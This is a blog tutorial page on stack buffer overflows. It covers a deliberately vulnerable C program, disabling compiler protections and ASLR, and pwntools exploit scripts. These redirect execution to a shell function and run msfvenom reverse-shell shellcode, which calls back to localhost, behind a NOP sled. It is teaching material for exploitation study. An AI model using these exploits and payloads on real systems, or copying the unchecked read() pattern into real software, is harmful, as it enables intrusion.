<!DOCTYPE html>
<html lang="en" dir="auto">

<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-48LCDX0T0B"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-48LCDX0T0B');
</script>

<meta name="google-site-verification" content="tMHAv1yKyGLEQa4u4DMm_H9UwwX9FXyeMRCiIvg4vRc"/>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Pwn 0x01: Buffer Overflow | NewHorizonz</title>
<meta name="keywords" content="pwn, binary, memory, x32, x64, gdb, memory corruption, binary exploitation, exploit development">
<meta name="description" content="WTH is a buffer overflow? Let&rsquo;s do it">
<meta name="author" content="Signore">
<link rel="canonical" href="https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/">
<link crossorigin="anonymous" href="/blog/assets/css/stylesheet.7832dde05580bc2c665f0a61fe276fe56876735f002590bd245c4c179ab6ea88.css" integrity="sha256-eDLd4FWAvCxmXwph/idv5Wh2c18AJZC9JFxMF5q26og=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/blog/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://the-root-user.github.io/blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://the-root-user.github.io/blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://the-root-user.github.io/blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://the-root-user.github.io/blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://the-root-user.github.io/blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Pwn 0x01: Buffer Overflow" />
<meta property="og:description" content="WTH is a buffer overflow? Let&rsquo;s do it" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/" />
<meta property="og:image" content="https://the-root-user.github.io/blog/images/cover-binexp-01.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-18T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-07-18T00:00:00&#43;00:00" /><meta property="og:site_name" content="NewHorizonz" />
<meta property="og:see_also" content="https://the-root-user.github.io/blog/posts/pwn-0x02-nx-bypass/" /><meta property="og:see_also" content="https://the-root-user.github.io/blog/posts/pwn-0x00-warmup/" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://the-root-user.github.io/blog/images/cover-binexp-01.png" />
<meta name="twitter:title" content="Pwn 0x01: Buffer Overflow"/>
<meta name="twitter:description" content="WTH is a buffer overflow? Let&rsquo;s do it"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://the-root-user.github.io/blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Pwn 0x01: Buffer Overflow",
      "item": "https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pwn 0x01: Buffer Overflow",
  "name": "Pwn 0x01: Buffer Overflow",
  "description": "WTH is a buffer overflow? Let\u0026rsquo;s do it",
  "keywords": [
    "pwn", "binary", "memory", "x32", "x64", "gdb", "memory corruption", "binary exploitation", "exploit development"
  ],
  "articleBody": "In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and weâ€™ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\n    program.c  #include #include  int helper(){ system(\"/bin/sh\"); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, hereâ€™s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, youâ€™ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script.     Terminal      So, initially weâ€™ll be working with those protections disabled and that is why weâ€™re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you donâ€™t need to care about them. Weâ€™ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, itâ€™s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle?\nLetâ€™s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Letâ€™s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLetâ€™s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploitâ€™s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 Bâ€™s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isnâ€™t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Letâ€™s arrange the bytes a little bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHereâ€™s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10  #!/bin/python3 from pwn import * exe = './program' payload=flat(\"A\"*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands ðŸ”¥\n    Terminal    Shellcode The helper function made the exploitation very easy for us this time but, normally, we donâ€™t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command:     Terminal  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \"\\x00\" -f py        Terminal    We will use gdb and take note of the memory address from where our buffer starts.     Terminal    Weâ€™re giving dumb input (just Aâ€™s) so that we can easily see our buffer.     Terminal    We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Letâ€™s prepare our exploit:     exploit.py  #!/bin/python3 from pwn import * exe = './program' elf = context.binary = ELF(exe, checksec=False) buf = b\"\" buf += b\"\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\" buf += b\"\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\" buf += b\"\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\" buf += b\"\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\" buf += b\"\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\" buf += b\"\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\" buf += b\"\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\" buf += b\"\\xd0\\x35\\x38\\x85\" payload=flat(\"\\x90\"*16,buf,\"A\"*(500-len(buf)),0xffffcc18) write(\"payload\",payload)    We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NoOPeration instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions wonâ€™t let our (noted) memory address go useless.\nLetâ€™s run the exploit to get our payload.\nWe run the program with a breakpoint set and feed to it the payload. Then, we see whatâ€™s there on the stack:     Terminal        Terminal    Letâ€™s setup a netcat listener in another terminal.     Terminal     Now, letâ€™s continue:     Terminal    Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see:     Terminal     Vola! We got our reverse shell ðŸ”¥ ðŸ˜Ž\n",
  "wordCount" : "1144",
  "inLanguage": "en",
  "image":"https://the-root-user.github.io/blog/images/cover-binexp-01.png","datePublished": "2022-07-18T00:00:00Z",
  "dateModified": "2022-07-18T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Signore"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "NewHorizonz",
    "logo": {
      "@type": "ImageObject",
      "url": "https://the-root-user.github.io/blog/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://the-root-user.github.io/blog" accesskey="h" title="New Horizonz (Alt + H)">
                <img src="https://the-root-user.github.io/blog/apple-touch-icon-grey.png" alt="logo" aria-label="logo"
                    height="28">New Horizonz</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://the-root-user.github.io/blog/author/" title="About Me">
                    <span>About Me</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/series/" title="Series">
                    <span>Series</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://the-root-user.github.io/blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://the-root-user.github.io/blog">Home</a>&nbsp;Â»&nbsp;<a href="https://the-root-user.github.io/blog/posts/">Posts</a></div>
    <h1 class="post-title">
      Pwn 0x01: Buffer Overflow
    </h1>
    <div class="post-meta"><span title='2022-07-18 00:00:00 +0000 UTC'>July 18, 2022</span>&nbsp;Â·&nbsp;6 min&nbsp;Â·&nbsp;Signore

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#the-stack">The Stack</a></li>
    <li><a href="#stack-abuse">Stack Abuse</a>
      <ul>
        <li><a href="#deep-dive">Deep Dive</a></li>
      </ul>
    </li>
    <li><a href="#eip-control">EIP Control</a>
      <ul>
        <li><a href="#code-reuse">Code Reuse</a></li>
      </ul>
    </li>
    <li><a href="#shellcode">Shellcode</a>
      <ul>
        <li><a href="#exploitation">Exploitation</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>In this post, we will see what is a buffer overflow and will exploit it to get code execution.
Do Not feel overwhelmed. Just follow along and we&rsquo;ll have fun.</p>
<p>If you are new to the series, check out my previous posts <a href="/blog/series/binary-exploitation-adventures">here</a></p>
<h2 id="the-stack">The Stack<a hidden class="anchor" aria-hidden="true" href="#the-stack">#</a></h2>
<p>Take this C program:</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">program.c</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">helper</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>      <span class="c1">// executes system shell
</span><span class="c1"></span><span class="p">}</span>

<span class="kt">int</span> <span class="nf">overflow</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">500</span><span class="p">];</span>       <span class="c1">// declaring buffer variable with specified size
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">userinput</span><span class="p">;</span>
    <span class="n">userinput</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">700</span><span class="p">);</span>   <span class="c1">// reading user input into buffer variable
</span><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">User provided %d bytes. Buffer content is: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">userinput</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="n">overflow</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
    </div>
</div>

<p>If we break down the program from the <code>main</code> function, it calls the <code>overflow</code> function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.</p>
<p>After compiling, here&rsquo;s what the program does:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="code.png" alt="code">
    </div>
</div>
</p>
<p>We have to compile the program with the following command:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gcc -m32 -fno-stack-protector -z execstack program.c -o program
</code></pre></div>
    </div>
</div>
</p>
<p>Also, we need to disable ASLR with the following command:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span> sudo tee /proc/sys/kernel/randomize_va_space
</code></pre></div>
    </div>
</div>

Everytime you reboot your machine, you&rsquo;ll have to do this step again.</p>
<details><summary><b>What's going on?</b></summary>
<blockquote>
<p>Modern programs come with a bunch of exploit mitigations.
For example, we can see the protections on the <code>ping</code> binary which is mostly present on linux as well as windows, with <a href="https://github.com/slimm609/checksec.sh"><code>checksec</code></a> script.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <p><img src="checksec1.png" alt="checksec-ping"></p>
<blockquote>
</blockquote>

    </div>
</div>
</p>
<p>So, initially we&rsquo;ll be working with those protections disabled and that is why we&rsquo;re giving those extra flags to gcc.</p>
<p>Here we can see the protections on our (compiled) program:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <p><img src="checksec2.png" alt="checksec-program"></p>
<blockquote>
</blockquote>

    </div>
</div>

For now, you don&rsquo;t need to care about them. We&rsquo;ll learn to bypass some anti-exploit mechanisms later on.</p>
</blockquote>
</details><br>
<br>
<p>In general, the stack is aligned this way:
<img loading="lazy" src="memory-layout0.png" alt="Stack Layout"  />
</p>
<p>Since our program is not dealing with any arguments, so, in our case, it&rsquo;s like this:
<img loading="lazy" src="memory-layout1.png" alt="Program Stack Layout"  />
</p>
<h2 id="stack-abuse">Stack Abuse<a hidden class="anchor" aria-hidden="true" href="#stack-abuse">#</a></h2>
<p>What if we give the program some unexpected input? <br>
What if we give an input, more in magnitude than the defined buffer is supposed to handle?</p>
<p>Let&rsquo;s take a look.</p>
<p>When we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.</p>
<p>Our goal is to overwrite the <code>return address</code> of the function so that we can point the EIP to a memory address of our own choice.
<img loading="lazy" src="memory-layout-overflow.png" alt="Memory Overflow"  />
</p>
<p>Normally, one can just get creative and give a program random inputs until something desirable is received back :)</p>
<h3 id="deep-dive">Deep Dive<a hidden class="anchor" aria-hidden="true" href="#deep-dive">#</a></h3>
<p>Let&rsquo;s give our program some random inputs, with the help of Python.<br>
(You know we can <code>pipe</code> the output of one command to another, right?)</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="program-input.png" alt="input">
    </div>
</div>

<p>Hnmm.. so, eventually, we broke the program!</p>
<p>Let&rsquo;s generate a pattern with <code>cyclic</code> utility and analyse the program with gdb to determine the offset of EIP.</p>
<details><summary>Alternative</summary>
<p>One can also use metasploit&rsquo;s <code>msf-pattern_create</code> and <code>msf-pattern_offset</code> to achieve the same result.</p>
</details><br>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="program-offset.png" alt="">
    </div>
</div>

<p>We get the offset to be <code>516</code>.</p>
<p>Now, we will send calculated input to see if we can control the EIP.</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="program-eip.png" alt="">
    </div>
</div>

<p>And.. Yes! We can see <code>0x42424242</code>, the hex code for the 4 B&rsquo;s we sent.</p>
<h2 id="eip-control">EIP Control<a hidden class="anchor" aria-hidden="true" href="#eip-control">#</a></h2>
<p>When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.</p>
<p><strong>Dead Code</strong> is a piece of code within a program which is not used when the program executes.</p>
<h3 id="code-reuse">Code Reuse<a hidden class="anchor" aria-hidden="true" href="#code-reuse">#</a></h3>
<p>We can see that the <code>helper</code> function isn&rsquo;t called during the program execution. Since we have control over the EIP, we can point it to the <code>helper</code> function to get it executed.</p>
<p>For that purpose, we need the memory address of the <code>helper</code> function.
We can find it with gdb as:</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="function-addr.png" alt="">
    </div>
</div>

<p>Our binary is 32-bit and 32-bit programs use <a href="https://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html">little-endian</a>, due to which we have to provide the memory address in reverse bytes order.</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="function-addr-error.png" alt="">
    </div>
</div>

<p>But.. we still get <code>segmentation fault</code>.</p>
<p>No need to worry. This is a common thing in exploit dev. Let&rsquo;s arrange the bytes a little bit and see what happens.</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="function-addr-no-error.png" alt="">
    </div>
</div>

<p>Yay! Did you see? a new process <code>/usr/bin/dash</code> started.. Our Shell!</p>
<p>But, wait.. it also did <code>exit</code> even before we could interact with it.</p>
<p>What happens under the hood is that a child process <code>dash</code> is started which operates by getting input from user (like <code>bash</code> or <code>sh</code>) but the parent process (our <code>program</code>) is done with its job and exits. The child process with no input, consequently, also exits.</p>
<p>We can take help of <code>cat</code> command to make the terminal wait for input.<br>
But, for convenience, we are going to use an awesome tool, a python library, <code>pwntools</code> to make our exploitation process easy.</p>
<p><strong><a href="https://github.com/Gallopsled/pwntools">Pwntools</a></strong></p>
<p>Here&rsquo;s a nice little exploit:</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">vim - exploit.py</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./program&#39;</span>

<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">516</span><span class="p">,</span><span class="mh">0x565561b9</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="pwn-vim.png" alt=""></p>

    </div>
</div>

<p>Upon running the exploit, we successfully get a system shell and can execute arbitrary commands ðŸ”¥</p>



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="pwn.png" alt="">
    </div>
</div>

<h2 id="shellcode">Shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode">#</a></h2>
<p>The <code>helper</code> function made the exploitation very easy for us this time but, normally, we don&rsquo;t have such a luxury very often. Then what are we supposed to do?</p>
<p>Well, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.</p>
<p><img loading="lazy" src="memory-layout-shellcode.png" alt=""  />
</p>
<p>For now, we are going to use <code>msfvenom</code>, an automated tool to generate the shellcode for us with this command:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>127.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">1236</span> -b <span class="s2">&#34;\x00&#34;</span> -f py
</code></pre></div>
    </div>
</div>




<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="msfvenom.png" alt="">
    </div>
</div>
</p>
<p>We will use gdb and take note of the memory address from where our buffer starts.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="stack-before1.png" alt="">
    </div>
</div>
</p>
<p>We&rsquo;re giving dumb input (just A&rsquo;s) so that we can easily see our buffer.



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">Terminal</div>
    </div>
    <div class="terminalbody">
        <img src="stack-before2.png" alt="">
    </div>
</div>
</p>
<p>We can see that our buffer is starting on the second line. Keep note of the memory address <code>0xffffcc18</code>.</p>
<h3 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h3>
<p>Let&rsquo;s prepare our exploit:



<div class="terminal space shadow">
    <div class="top">
        <div class="btns">
            <span class="circle red"></span>
            <span class="circle yellow"></span>
            <span class="circle green"></span>
        </div>
        <div class="title">exploit.py</div>
    </div>
    <div class="terminalbody">
        <div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./program&#39;</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\x48\x8a\xd9\x40\xd9\xec\xd9\x74\x24\xf4\x5e\x29</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x12\x83\xc6\x04\x31\x7e\x0e\x03\x36\x84\x3b</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb5\xf7\x43\x4c\xd5\xa4\x30\xe0\x70\x48\x3e\xe7\x35</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x8d\x68\xa6\xeb\xbd\x56\x04\x8b\xf7\xd1\x6f\xe3</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x78\x22\x90\xf2\xee\x20\x90\xf0\x3a\xad\x71\x48\xa4</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfe\x20\xfb\x9a\xfc\x4b\x1a\x11\x82\x1e\xb4\xc4\xac</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xed\x2c\x71\x9c\x3e\xce\xe8\x6b\xa3\x5c\xb8\xe2\xc5</span><span class="s2">&#34;</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd0\x35\x38\x85</span><span class="s2">&#34;</span>

<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">500</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)),</span><span class="mh">0xffffcc18</span><span class="p">)</span>

